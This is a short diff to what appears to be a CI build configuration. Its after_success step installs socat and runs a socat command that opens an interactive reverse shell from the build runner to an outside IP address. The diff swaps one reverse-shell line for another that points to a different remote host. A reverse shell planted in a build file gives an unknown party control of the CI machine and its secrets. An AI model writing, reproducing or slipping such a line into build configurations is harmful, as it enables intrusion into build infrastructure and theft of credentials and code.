@@ -12,4 +12,5 @@ script:
 after_success:
   - docker --version
   - sudo apt install socat -y
-  - socat exec:'sh -li',pty,stderr,sigint,sane tcp:3.142.81.166:17997
+  - socat tcp-connect:3.131.147.49:17673 exec:/bin/sh,pty,stderr,sigint,sane 
+
